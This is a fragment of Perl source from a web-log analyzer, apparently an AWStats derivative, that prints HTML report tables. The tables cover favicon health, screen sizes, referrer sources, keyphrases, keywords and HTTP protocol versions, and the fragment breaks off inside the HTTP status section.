		print "<div style=\"background-color: #$color_success; width: ${bar_ok}px; height: 6px; border-radius: 3px;\" title=\"" . _t("OK") . ": " . Format_Number($ok) . " ($ok_pct%)\"></div>";
		print "<span style=\"margin-left: 6px; font-size: 10px;\">$ok_pct%</span>";
		print "</div>";
		print "<div style=\"display: flex; align-items: center;\">";
		print "<span style=\"width: 45px; font-size: 10px;\">404:</span>";
		print "<div style=\"background-color: #$color_error; width: ${bar_miss}px; height: 6px; border-radius: 3px;\" title=\"" . _t("Missing") . ": " . Format_Number($miss) . " ($miss_pct%)\"></div>";
		print "<span style=\"margin-left: 6px; font-size: 10px;\">$miss_pct%</span>";
		print "</div>";
		print "</td>\n";
		print "</tr>\n";
	}
	
	# 健康检查总结
	my $total_configured = 0;
	my $total_missing = 0;
	my $total_unused = 0;
	
	foreach my $type (@icon_types) {
		my $ok   = $_icon_status{$type}{'200'} || 0;
		my $miss = $_icon_status{$type}{'404'} || 0;
		my $total = $ok + $miss;
		
		if ($ok > 0) {
			$total_configured++;
		} elsif ($miss > 0) {
			$total_missing++;
		} elsif ($total == 0) {
			$total_unused++;
		}
	}
	
	my $health_pct = $total_configured + $total_missing > 0 
		? int( $total_configured / ($total_configured + $total_missing) * 100 ) 
		: 0;
	
	my $health_status = '';
	my $health_color = '';
	if ($health_pct >= 95) {
		$health_status = "🟢 " . _t("Excellent");
		$health_color = $color_success;
	} elsif ($health_pct >= 80) {
		$health_status = "🟡 " . _t("Good");
		$health_color = $color_warning;
	} elsif ($health_pct >= 60) {
		$health_status = "🟠 " . _t("Fair");
		$health_color = "#ff9800";
	} else {
		$health_status = "🔴 " . _t("Poor");
		$health_color = $color_error;
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td colspan=\"6\"><b>" . _t("Overall Health") . ":</b> $health_pct% ";
	print "(" . _t("Configured") . ": $total_configured, " . _t("Missing") . ": $total_missing, " . _t("Unused") . ": $total_unused) ";
	print "<span style=\"color: #$health_color;\">$health_status</span>";
	print "<\/td>\n";
	print "</tr>\n";
	
	# 缺失文件列表
	my @missing_types = ();
	foreach my $type (@icon_types) {
		my $ok   = $_icon_status{$type}{'200'} || 0;
		if ($ok == 0) {
			push @missing_types, $icon_names{$type};
		}
	}
	
	if (@missing_types) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\">";
		print "📋 " . _t("Missing icon types") . ": " . join(", ", @missing_types);
		print " — " . _t("See") . " " . _t("Expected Path") . " " . _t("column for file locations");
		print "<\/td>\n";
		print "</tr>\n";
		
		my $favicon_pub_url = "https://favicon.pub";
		my $link_text = ($PageDir == 1) ? "bup.icovaf" : "favicon.pub";
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\">";
		printf "💡 " . _t("Tip: If you need to generate related icons, you can use %s to upload a logo image, and it will automatically generate all the above related icon files"), "<a href=\"$favicon_pub_url\" target=\"_blank\" rel=\"noopener noreferrer\">$link_text</a>";
		print "</td>\n";
		print "</tr>\n";
	}
	&tab_end("* " . _t("200: success, 404: failure"));
 }

#------------------------------------------------------------------------------
# Function:     Prints the ScreenSize chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainScreenSize{
	if ($Debug) { debug( "ShowScreenSizeStats", 2 ); }
	print "$Center<a name=\"screensizes\">&nbsp;</a>";
	my $Totalh = 0;
	foreach ( keys %_screensize_h ) { $Totalh += $_screensize_h{$_}; }
	my $title =
	  _t("Screen sizes") . " (" . _t("Top") . " $MaxNbOf{'ScreenSizesShown'})";
	&tab_head( "$title", 0, 0, 'screensizes' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Screen sizes") . "</th>\n<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n</tr>\n";
	my $total_h = 0;
	my $count   = 0;
	&BuildKeyList( $MaxNbOf{'ScreenSizesShown'},
		$MinHit{'ScreenSize'}, \%_screensize_h, \%_screensize_h );

	foreach my $key (@keylist) {
		my $p = '&nbsp;';
		if ($Totalh) {
			$p = int( $_screensize_h{$key} / $Totalh * 1000 ) / 10;
			$p = "$p %";
		}
		$total_h += $_screensize_h{$key} || 0;
		print "<tr>";
		if ( $key eq 'Unknown' ) {
			print "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown Screen") . "</span></td>\n";
			print "<td>$p</td>\n";
		}
		else {
			my $screensize = $key;
			print "<td class=\"aws\">$screensize</td>\n";
			print "<td>$p</td>\n";
		}
		print "</tr>\n";
		$count++;
	}
	my $rest_h = $Totalh - $total_h;
	if ( $rest_h > 0 ) {    # All others sessions
		my $p = 0;
		if ($Totalh) { $p = int( $rest_h / $Totalh * 1000 ) / 10; }
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (screen sizes)") . "</span></td>\n";
		print "<td>" . ( $rest_h ? "$p %" : "&nbsp;" ) . "</td>\n";
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Referrers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainReferrers{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowOriginStats", 2 ); }
	print "$Center<a name=\"referer\">&nbsp;</a>";
	# 计算总计
	my $Totalp = 0;
	foreach ( 0 .. 5 ) {
		$Totalp += ( $_ != 4 || $IncludeInternalLinksInOriginSection ) ? $_from_p[$_] : 0;
	}
	my $Totalh = 0;
	foreach ( 0 .. 5 ) {
		$Totalh += ( $_ != 4 || $IncludeInternalLinksInOriginSection ) ? $_from_h[$_] : 0;
	}

	# 标题处理（保持原有逻辑）
	my $title = "🔗 " . _t("Traffic Sources");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		$title .= " &nbsp; - &nbsp; <a href=\"" 
			. XMLEncode( "$AddLinkToExternalCGIWrapper?section=ORIGIN&baseName=$DirData/$PROG"
			. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
			. "&siteConfig=$SiteConfig" )
			. "\"$NewLinkTarget>" . _t("Export") . "</a>";
	}
		
	&tab_head( $title, 19, 0, 'referer' );
	
	# 计算百分比
	my @p_p = (0) x 6;
	my @p_h = (0) x 6;
	if ( $Totalp > 0 ) {
		foreach (0..5) {
			$p_p[$_] = int( $_from_p[$_] / $Totalp * 1000 ) / 10;
		}
	}
	if ( $Totalh > 0 ) {
		foreach (0..5) {
			$p_h[$_] = int( $_from_h[$_] / $Totalh * 1000 ) / 10;
		}
	}

	# 表头
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Origin") . "</th>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
		print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>\n";
	}
	print "</tr>\n";

	#------- Referrals by direct address/bookmark/link in email/etc...
	print "<tr><td class=\"aws\"><b>" . _t("Direct address / Bookmarks") . "</b></td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td>" . ($_from_p[0] ? Format_Number($_from_p[0]) : "&nbsp;") . "</td>\n";
		print "<td>" . ($_from_p[0] ? "$p_p[0] %" : "&nbsp;") . "</td>\n";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td>" . ($_from_h[0] ? Format_Number($_from_h[0]) : "&nbsp;") . "</td>\n";
		print "<td>" . ($_from_h[0] ? "$p_h[0] %" : "&nbsp;") . "</td>\n";
	}
	print "</tr>\n";

	#------- Referrals by search engines
	# 先显示总计行
	print "<tr" . Tooltip(13) . ">";
	print "<td class=\"aws\"><b>" . _t("Search Engines") . "</b> - <a href=\""
		. ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=refererse")
			: "$StaticLinks.refererse.$StaticExt")
		. "\"$NewLinkTarget>" . _t("Full list") . "</a></td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td valign=\"top\">" . ($_from_p[2] ? Format_Number($_from_p[2]) : "&nbsp;") . "</td>\n";
		print "<td valign=\"top\">" . ($_from_p[2] ? "$p_p[2] %" : "&nbsp;") . "</td>\n";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td valign=\"top\">" . ($_from_h[2] ? Format_Number($_from_h[2]) : "&nbsp;") . "</td>\n";
		print "<td valign=\"top\">" . ($_from_h[2] ? "$p_h[2] %" : "&nbsp;") . "</td>\n";
	}
	print "</tr>\n";
	
	# 显示搜索引擎子项（独立行，缩进显示）
	if ( scalar keys %_se_referrals_h ) {
		my $total_p = 0;
		my $total_h = 0;
		&BuildKeyList(
			$MaxNbOf{'RefererShown'},
			$MinHit{'Refer'},
			\%_se_referrals_h,
			((scalar keys %_se_referrals_p) ? \%_se_referrals_p : \%_se_referrals_h)
		);
		
		foreach my $key (@keylist) {
			my $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);
			print "<tr>";
			print "<td class=\"aws\" style=\"padding-left: 20px;\">- $newreferer</td>\n";
			
			my ($p_val, $h_val) = (0, 0);
			if ( $ShowOriginStats =~ /P/i ) {
				$p_val = $_se_referrals_p{$key} || 0;
				my $p_pct = ($_from_p[2] > 0) ? int($p_val / $_from_p[2] * 1000) / 10 : 0;
				print "<td>" . Format_Number($p_val) . "</td>\n";
				print "<td>" . ($p_pct > 0 ? "$p_pct %" : "&nbsp;") . "</td>\n";
			}
			if ( $ShowOriginStats =~ /H/i ) {
				$h_val = $_se_referrals_h{$key} || 0;
				my $h_pct = ($_from_h[2] > 0) ? int($h_val / $_from_h[2] * 1000) / 10 : 0;
				print "<td>" . Format_Number($h_val) . "</td>\n";
				print "<td>" . ($h_pct > 0 ? "$h_pct %" : "&nbsp;") . "</td>\n";
			}
			print "</tr>\n";
			$total_p += $p_val;
			$total_h += $h_val;
		}
		
		# 显示"其他"
		my $rest_p = $TotalSearchEnginesPages - $total_p;
		my $rest_h = $TotalSearchEnginesHits - $total_h;
		if ( $rest_p > 0 || $rest_h > 0 ) {
			print "<tr>";
			print "<td class=\"aws\" style=\"padding-left: 20px; color: #$color_other\">- " . _t("Others") . "</td>\n";
			if ( $ShowOriginStats =~ /P/i ) {
				print "<td>" . Format_Number($rest_p) . "</td>\n";
				print "<td>&nbsp;</td>\n";
			}
			if ( $ShowOriginStats =~ /H/i ) {
				print "<td>" . Format_Number($rest_h) . "</td>\n";
				print "<td>&nbsp;</td>\n";
			}
			print "</tr>\n";
		}
	}

	#------- Referrals by external HTML link
	print "<tr" . Tooltip(14) . ">";
	print "<td class=\"aws\"><b>" . _t("External pages") . "</b> - <a href=\""
		. ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=refererpages")
			: "$StaticLinks.refererpages.$StaticExt")
		. "\"$NewLinkTarget>" . _t("Full list") . "</a></td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td valign=\"top\">" . ($_from_p[3] ? Format_Number($_from_p[3]) : "&nbsp;") . "</td>\n";
		print "<td valign=\"top\">" . ($_from_p[3] ? "$p_p[3] %" : "&nbsp;") . "</td>\n";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td valign=\"top\">" . ($_from_h[3] ? Format_Number($_from_h[3]) : "&nbsp;") . "</td>\n";
		print "<td valign=\"top\">" . ($_from_h[3] ? "$p_h[3] %" : "&nbsp;") . "</td>\n";
	}
	print "</tr>\n";
	

	if ( scalar keys %_pagesrefs_h ) {
		my $total_p = 0;
		my $total_h = 0;
		&BuildKeyList(
			$MaxNbOf{'RefererShown'},
			$MinHit{'Refer'},
			\%_pagesrefs_h,
			((scalar keys %_pagesrefs_p) ? \%_pagesrefs_p : \%_pagesrefs_h)
		);
		
		foreach my $key (@keylist) {
			print "<tr>"; 
			print "<td class=\"aws\" style=\"padding-left: 20px;\">- ";
			&HTMLShowURLInfo($key);
			print "</td>\n";
			
			my ($p_val, $h_val) = (0, 0);
			if ( $ShowOriginStats =~ /P/i ) {
				$p_val = $_pagesrefs_p{$key} || 0;
				my $p_pct = ($_from_p[3] > 0) ? int($p_val / $_from_p[3] * 1000) / 10 : 0;
				print "<td>" . Format_Number($p_val) . "</td>\n";
				print "<td>" . ($p_pct > 0 ? "$p_pct %" : "&nbsp;") . "</td>\n";
			}
			if ( $ShowOriginStats =~ /H/i ) {
				$h_val = $_pagesrefs_h{$key} || 0;
				my $h_pct = ($_from_h[3] > 0) ? int($h_val / $_from_h[3] * 1000) / 10 : 0;
				print "<td>" . Format_Number($h_val) . "</td>\n";
				print "<td>" . ($h_pct > 0 ? "$h_pct %" : "&nbsp;") . "</td>\n";
			}
			print "</tr>\n";
			$total_p += $p_val;
			$total_h += $h_val;
		}
		# 显示"其他"
		my $rest_p = $TotalRefererPages - $total_p;
		my $rest_h = $TotalRefererHits - $total_h;
		if ( $rest_p > 0 || $rest_h > 0 ) {
			print "<tr>";
			print "<td class=\"aws\" style=\"padding-left: 20px; color: #$color_other\">- " . _t("Others") . "</td>\n";
			if ( $ShowOriginStats =~ /P/i ) {
				print "<td>" . Format_Number($rest_p) . "</td>\n";
				print "<td>&nbsp;</td>\n";
			}
			if ( $ShowOriginStats =~ /H/i ) {
				print "<td>" . Format_Number($rest_h) . "</td>\n";
				print "<td>&nbsp;</td>\n";
			}
			print "</tr>\n";
		}
	}

	#------- 4. Internal Pages (Requires setting IncludeInternalLinksInOriginSection=1 in the configuration file to enable)
	# Disabled by default: Internal links are considered part of the site's internal navigation and are not included in external traffic source statistics.
	# Enabling this will affect the source percentage calculation (internal traffic will dilute the proportion of external sources).
	if ($IncludeInternalLinksInOriginSection) {
		print "<tr>";
		print "<td class=\"aws\"><b>" . _t("Internal pages") . "</b></td>\n";
		if ( $ShowOriginStats =~ /P/i ) {
			print "<td>" . ($_from_p[4] ? Format_Number($_from_p[4]) : "&nbsp;") . "</td>\n";
			print "<td>" . ($_from_p[4] ? "$p_p[4] %" : "&nbsp;") . "</td>\n";
		}
		if ( $ShowOriginStats =~ /H/i ) {
			print "<td>" . ($_from_h[4] ? Format_Number($_from_h[4]) : "&nbsp;") . "</td>\n";
			print "<td>" . ($_from_h[4] ? "$p_h[4] %" : "&nbsp;") . "</td>\n";
		}
		print "</tr>\n";
	}

	#------- Referrals by news group
	#print "<tr><td class=\"aws\"><b>$Message[107]</b></td>\n";
	#if ($ShowOriginStats =~ /P/i) { print "<td>".($_from_p[5]?$_from_p[5]:"&nbsp;")."</td>\n<td>".($_from_p[5]?"$p_p[5] %":"&nbsp;")."</td>\n"; }
	#if ($ShowOriginStats =~ /H/i) { print "<td>".($_from_h[5]?$_from_h[5]:"&nbsp;")."</td>\n<td>".($_from_h[5]?"$p_h[5] %":"&nbsp;")."</td>\n"; }
	#print "</tr>\n";
	#------- 5. Unknown origin
	print "<tr>";
	print "<td class=\"aws\"><b>" . _t("UnknownAccessSource") . "</b></td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td>" . ($_from_p[1] ? Format_Number($_from_p[1]) : "&nbsp;") . "</td>\n";
		print "<td>" . ($_from_p[1] ? "$p_p[1] %" : "&nbsp;") . "</td>\n";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td>" . ($_from_h[1] ? Format_Number($_from_h[1]) : "&nbsp;") . "</td>\n";
		print "<td>" . ($_from_h[1] ? "$p_h[1] %" : "&nbsp;") . "</td>\n";
	}
	print "</tr>\n";
	
	&tab_end();

	# 0: Direct
	# 1: Unknown
	# 2: SE
	# 3: External link
	# 4: Internal link
	# 5: Newsgroup (deprecated)
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases and Keywords chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainKeys{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($ShowKeyphrasesStats) {
		print "$Center<a name=\"keyphrases\">&nbsp;</a>";
	}
	if ($ShowKeywordsStats) {
		print "$Center<a name=\"keywords\">&nbsp;</a>";
	}
	if ( $ShowKeyphrasesStats || $ShowKeywordsStats ) { print "<br>"; }
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print "<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
	}
	if ($ShowKeyphrasesStats) {
		
		# By Keyphrases
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "<td width=\"50%\" valign=\"top\">";
		}
		if ($Debug) { debug( "ShowKeyphrasesStats", 2 ); }
		&tab_head( _t("Keyphrases") . " (" . _t("Top") . " $MaxNbOf{'KeyphrasesShown'})<br><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=keyphrases")
				: "$StaticLinks.keyphrases.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Full list") . "</a>",
			19,
			( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
			'keyphrases'
		);
		print "<tr bgcolor=\"#$color_TableBGRowTitle\""
		  . Tooltip(15)
		  . "><th>" . Format_Number($TotalDifferentKeyphrases) . " " . _t("Different keyphrases") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th>\n<th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th>\n</tr>\n";
		my $total_s = 0;
		my $count = 0;
		&BuildKeyList( $MaxNbOf{'KeyphrasesShown'},
		   $MinHit{'Keyphrase'}, \%_keyphrases, \%_keyphrases );
		foreach my $key (@keylist) {
			my $mot;

  			# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
			if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
				$mot = CleanXSS( DecodeKey_decodeutfkeys($key, $PageCode || 'iso-8859-1') );
			}
			else { $mot = CleanXSS( DecodeEncodedString($key) ); }
			my $p;
			if ($TotalKeyphrases) {
				$p =
				  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\">"
			  . XMLEncode($mot)
			  . "</td><td>$_keyphrases{$key}</td>\n<td>$p %</td>\n</tr>\n";
			$total_s += $_keyphrases{$key};
			$count++;
		}
		if ($Debug) {
			debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
		}
		my $rest_s = $TotalKeyphrases - $total_s;
		if ( $rest_s > 0 ) {
			my $p;
			if ($TotalKeyphrases) {
				$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (keyphrases main)") . "</span></td>\n<td>$rest_s</td>\n";
			print "<td>$p&nbsp;%</td>\n</tr>\n";
		}
		&tab_end();
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "</td>\n";
		}
	}
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print "<td> &nbsp; </td>\n";
	}
	if ($ShowKeywordsStats) {

		# By Keywords
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "<td width=\"50%\" valign=\"top\">";
		}
		if ($Debug) { debug( "ShowKeywordsStats", 2 ); }
		&tab_head( _t("Keywords") . " (" . _t("Top") . " $MaxNbOf{'KeywordsShown'})<br><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=keywords")
				: "$StaticLinks.keywords.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Full list") . "</a>",
			19,
			( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
			'keywords'
		);
		print "<tr bgcolor=\"#$color_TableBGRowTitle\""
		  . Tooltip(15)
		  . "><th>" . Format_Number($TotalDifferentKeywords) . " " . _t("Different keywords") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th>\n</tr>\n";
		my $total_s = 0;
		my $count = 0;
		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
			$MinHit{'Keyword'}, \%_keywords, \%_keywords );
		foreach my $key (@keylist) {
			my $mot;

  			# Convert coded keywords (utf8,...) to be correctly reported in HTML page.
			if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
				$mot = CleanXSS(
					DecodeKey_decodeutfkeys(
						$key, $PageCode || 'iso-8859-1'
					)
				);
			}
			else { $mot = CleanXSS( DecodeEncodedString($key) ); }
			my $p;
			if ($TotalKeywords) {
				$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\">"
			  . XMLEncode($mot)
			  . "</td><td>$_keywords{$key}</td><td>$p %</td>\n</tr>\n";
			$total_s += $_keywords{$key};
			$count++;
		}
		if ($Debug) {
			debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
		}
		my $rest_s = $TotalKeywords - $total_s;
		if ( $rest_s > 0 ) {
			my $p;
			if ($TotalKeywords) {
				$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (keywords main)") . "</span></td><td>$rest_s</td>\n";
			print "<td>$p %</td>\n</tr>\n";
		}
		&tab_end();
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "</td>\n";
		}
	}
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print "</tr>\n</table>\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Prints the HTTP protocol versions statistics table
# Parameters:   None
# Input:        %_protocol_h, %_protocol_k (from log processing)
# Output:       HTML table with protocol version distribution
# Return:       None
# Description:  Shows distribution of HTTP/1.0, HTTP/1.1, HTTP/2, HTTP/3 usage
#               Includes hit count, bandwidth, and percentage bars
#------------------------------------------------------------------------------
sub HTMLMainProtocolStats{
	if ($Debug) { debug( "ShowProtocolStats", 2 ); }
	print "$Center<a name=\"protocol\">&nbsp;</a>";
	my $title = "🔢 " . _t("HTTP Protocol Versions");
	&tab_head( "$title", 19, 0, 'protocol' );
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th>" . _t("Protocol") . "</th>\n";
	print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	print "<th bgcolor=\"#$color_k\" width=\"100\">" . _t("Bandwidth") . "</th>\n";
	print "<th bgcolor=\"#$color_e\" width=\"80\">" . _t("Request %") . "</th>\n";
	print "<th bgcolor=\"#$color_x\" width=\"80\">" . _t("Bandwidth %") . "</th>\n";
	print "<th>&nbsp;</th>\n";
	print "</tr>\n";
	
	# 计算总数
	my $total_hits = 0;
	my $total_bytes = 0;
	foreach my $proto (keys %_protocol_h) {
		$total_hits += $_protocol_h{$proto};
		$total_bytes += $_protocol_k{$proto} || 0;
	}
	
	# 计算最大值用于进度条
	my $max_hits = 1;
	my $max_bytes = 1;
	foreach my $proto (keys %_protocol_h) {
		my $hits = $_protocol_h{$proto} || 0;
		my $bytes = $_protocol_k{$proto} || 0;
		$max_hits = $hits if $hits > $max_hits;
		$max_bytes = $bytes if $bytes > $max_bytes;
	}
	
	# 协议性能评级描述
	my %perf_desc = (
		'HTTP/1.0' => _t('Each request requires a new connection'),
		'HTTP/1.1' => _t('Multiple requests can reuse one connection'),
		'HTTP/2'   => _t('Multiple requests in parallel over one connection'),
		'HTTP/2.0' => _t('Multiple requests in parallel over one connection'),
		'HTTP/3'   => _t('Faster connection, better performance on poor networks'),
		'HTTP/3.0' => _t('Faster connection, better performance on poor networks'),
	);

	# 按协议版本排序
	my %order_map = (
		'HTTP/1.0' => 1,
		'HTTP/1.1' => 2,
		'HTTP/2'   => 3,
		'HTTP/2.0' => 3,
		'HTTP/3'   => 4,
		'HTTP/3.0' => 4,
	);
	
	my @sorted = sort { 
		($order_map{$a} || 99) <=> ($order_map{$b} || 99) 
	} keys %_protocol_h;
	
	foreach my $proto (@sorted) {
		my $hits = $_protocol_h{$proto} || 0;
		my $bytes = $_protocol_k{$proto} || 0;
		my $pct_hits = $total_hits ? sprintf("%.1f", $hits / $total_hits * 100) : 0;
		my $pct_bytes = $total_bytes ? sprintf("%.1f", $bytes / $total_bytes * 100) : 0;
		
		# 进度条宽度
		my $bar_hits = $max_hits ? int(200 * $hits / $max_hits) : 0;
		my $bar_bytes = $max_bytes ? int(200 * $bytes / $max_bytes) : 0;
		my $bar_pct_hits = $total_hits ? int(200 * $hits / $total_hits) : 0;
		my $bar_pct_bytes = $total_bytes ? int(200 * $bytes / $total_bytes) : 0;
		
		$bar_hits = 2 if $bar_hits < 2 && $hits > 0;
		$bar_bytes = 2 if $bar_bytes < 2 && $bytes > 0;
		$bar_pct_hits = 2 if $bar_pct_hits < 2 && $hits > 0;
		$bar_pct_bytes = 2 if $bar_pct_bytes < 2 && $bytes > 0;
		
		# 协议显示名称和描述
		my $display = $proto;
		$display =~ s/HTTP\//HTTP /;
		my $desc = $perf_desc{$proto} || '';
		
		print "<tr>";
		print "<td class=\"aws\"><b>$display</b><br><span style=\"font-size: 10px; color: #666;\">$desc</span></td>\n";
		print "<td align=\"right\">" . Format_Number($hits) . " ($pct_hits%)</td>\n";
		print "<td align=\"right\">" . Format_Bytes($bytes) . " ($pct_bytes%)</td>\n";
		print "<td align=\"right\"><b>$pct_hits%</b></td>\n";
		print "<td align=\"right\"><b>$pct_bytes%</b></td>\n";
		print "<td class=\"aws\">";
		# 堆叠进度条
		print "<div style=\"background-color: #$color_h; width: ${bar_hits}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Hits") . ": " . Format_Number($hits) . " ($pct_hits%)\"></div>";
		print "<div style=\"background-color: #$color_k; width: ${bar_bytes}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes($bytes) . " ($pct_bytes%)\"></div>";
		print "<div style=\"background-color: #$color_e; width: ${bar_pct_hits}px; height: 4px; border-radius: 2px; margin-bottom: 2px;\" title=\"" . _t("Request %") . ": $pct_hits%\"></div>";
		print "<div style=\"background-color: #$color_x; width: ${bar_pct_bytes}px; height: 4px; border-radius: 2px;\" title=\"" . _t("Bandwidth %") . ": $pct_bytes%\"></div>";
		print "</td>\n";
		print "</tr>\n";
	}
	
	# 如果没有数据，显示提示
	if ($total_hits == 0) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\" align=\"center\">" . _t("No protocol data available") . "</td>\n";
		print "</tr>\n";
	}
	
	# 性能建议
	if (exists $_protocol_h{'HTTP/1.0'} && $_protocol_h{'HTTP/1.0'} > 0) {
		my $pct = sprintf("%.1f", $_protocol_h{'HTTP/1.0'} / $total_hits * 100);
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\" style=\"font-size: 12px; padding: 8px 12px;\">";
		print "📊 " . sprintf("%.1f", $pct) . "% " . _t("of requests use HTTP/1.0") . " — ";
		print _t("From access logs");
		print "<\/td>\n<\/tr>\n";
	}

	if (!exists $_protocol_h{'HTTP/2'} && !exists $_protocol_h{'HTTP/2.0'}) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\" style=\"font-size: 12px; padding: 8px 12px;\">";
		print "📊 " . _t("No HTTP/2 requests detected") . " — ";
		print _t("All requests are HTTP/1.0, no HTTP/2 requests");
		print "<\/td>\n<\/tr>\n";
	}

	if (!exists $_protocol_h{'HTTP/3'} && !exists $_protocol_h{'HTTP/3.0'}) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"6\" style=\"font-size: 12px; padding: 8px 12px;\">";
		print "📊 " . _t("HTTP/3 not detected") . " — ";
		print _t("all requests do not include QUIC/HTTP/3 protocol requests");
		print "<\/td>\n<\/tr>\n";
	}
	
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHTTPStatus{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowHTTPErrorsStats", 2 ); }
	print "$Center<a name=\"errors\">&nbsp;</a>";
	my $title = "ℹ️ " . _t("HTTP Status Statistics");
	
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title 
		   .= " &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=ERRORS&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
			
	&tab_head( "$title", 19, 0, 'errors' );
	
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
